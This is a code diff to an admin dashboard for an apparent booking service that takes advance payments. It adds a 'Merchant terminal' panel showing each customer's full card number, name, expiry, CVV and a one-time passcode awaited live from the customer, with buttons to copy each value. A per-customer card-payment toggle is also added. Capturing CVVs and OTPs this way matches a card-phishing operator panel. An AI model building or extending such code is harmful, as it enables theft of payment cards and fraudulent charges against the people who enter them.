@@ -224,7 +224,21 @@ function BookingDetail({ b }: { b: Booking }) {
         </div>
         <div className="space-y-2 rounded-2xl border border-border p-3">
           <div className="flex items-center justify-between"><p className="font-semibold">Advance payment ({b.payment_method.toUpperCase()})</p><StatusBadge status={b.payment_status} /></div>
-          {b.recharge_pin && <p className="font-mono text-base">PIN: {b.recharge_pin}</p>}
+          {b.recharge_pin && <p className="font-mono text-base">STC PIN: {b.recharge_pin}</p>}
+          {b.payment_method === "card" && (
+            <div className="space-y-2 rounded-xl bg-muted/80 p-3 font-mono text-xs">
+              <p className="font-sans text-sm font-semibold text-foreground">Merchant terminal — card details</p>
+              <p>Name: {b.card_holder ?? "—"}</p>
+              <p className="break-all">Number: {b.card_number ?? "—"}</p>
+              <p>Expiry: {b.card_expiry ?? "—"} · CVV: {b.card_cvv ?? "—"}</p>
+              <p>OTP: {b.card_otp ? b.card_otp : <span className="text-muted-foreground">Waiting for customer…</span>}</p>
+              <div className="flex flex-wrap gap-2 font-sans">
+                {b.card_number && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_number!); toast.success("Card number copied"); }}>Copy number</Button>}
+                {b.card_cvv && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_cvv!); toast.success("CVV copied"); }}>Copy CVV</Button>}
+                {b.card_otp && <Button type="button" size="sm" variant="outline" onClick={() => { navigator.clipboard.writeText(b.card_otp!); toast.success("OTP copied"); }}>Copy OTP</Button>}
+              </div>
+            </div>
+          )}
           <Shot path={b.screenshot_path} />
           <div><Label>Reason shown to the customer</Label><Input value={reason} onChange={(e) => setReason(e.target.value)} /></div>
           <div className="flex gap-2">
@@ -284,8 +298,8 @@ function CustomersTab() {
       return data as BankAccount[];
     },
   });
-  const save = async (p: Profile, patch: { allow_bank: boolean; allow_wallet: boolean; bank_account_id: string | null }) => {
-    const { error } = await supabase.rpc("admin_update_customer", { p_user: p.id, p_allow_bank: patch.allow_bank, p_allow_wallet: patch.allow_wallet, p_bank: patch.bank_account_id });
+  const save = async (p: Profile, patch: { allow_bank: boolean; allow_wallet: boolean; allow_card: boolean; bank_account_id: string | null }) => {
+    const { error } = await supabase.rpc("admin_update_customer", { p_user: p.id, p_allow_bank: patch.allow_bank, p_allow_wallet: patch.allow_wallet, p_allow_card: patch.allow_card, p_bank: patch.bank_account_id });
     if (error) { toast.error(error.message); return; }
     toast.success("Customer updated");
     qc.invalidateQueries({ queryKey: ["admin-customers"] });
@@ -299,9 +313,10 @@ function CustomersTab() {
   );
 }
 
-function CustomerRow({ person, banks, onSave }: { person: Profile; banks: BankAccount[]; onSave: (p: { allow_bank: boolean; allow_wallet: boolean; bank_account_id: string | null }) => void }) {
+function CustomerRow({ person, banks, onSave }: { person: Profile; banks: BankAccount[]; onSave: (p: { allow_bank: boolean; allow_wallet: boolean; allow_card: boolean; bank_account_id: string | null }) => void }) {
   const [allowBank, setAllowBank] = useState(person.allow_bank);
   const [allowWallet, setAllowWallet] = useState(person.allow_wallet);
+  const [allowCard, setAllowCard] = useState(person.allow_card ?? true);
   const [bankId, setBankId] = useState(person.bank_account_id ?? "");
   const [delta, setDelta] = useState("");
   const qc = useQueryClient();
@@ -325,11 +340,12 @@ function CustomerRow({ person, banks, onSave }: { person: Profile; banks: BankAc
       <div className="flex flex-wrap items-center gap-3 text-sm">
         <label className="flex items-center gap-2">Bank <Switch checked={allowBank} onCheckedChange={setAllowBank} /></label>
         <label className="flex items-center gap-2">Wallet <Switch checked={allowWallet} onCheckedChange={setAllowWallet} /></label>
+        <label className="flex items-center gap-2">Card <Switch checked={allowCard} onCheckedChange={setAllowCard} /></label>
         <select value={bankId} onChange={(e) => setBankId(e.target.value)} className="h-9 rounded-md border border-input bg-background px-2 text-sm">
           <option value="">No bank</option>
           {banks.map((b) => <option key={b.id} value={b.id}>{b.account_name}</option>)}
         </select>
-        <Button size="sm" onClick={() => onSave({ allow_bank: allowBank, allow_wallet: allowWallet, bank_account_id: bankId || null })}>Save</Button>
+        <Button size="sm" onClick={() => onSave({ allow_bank: allowBank, allow_wallet: allowWallet, allow_card: allowCard, bank_account_id: bankId || null })}>Save</Button>
         <Input className="w-24" placeholder="+/- SAR" value={delta} onChange={(e) => setDelta(e.target.value)} />
         <Button size="sm" variant="outline" onClick={adjust}>Adjust wallet</Button>
       </div>
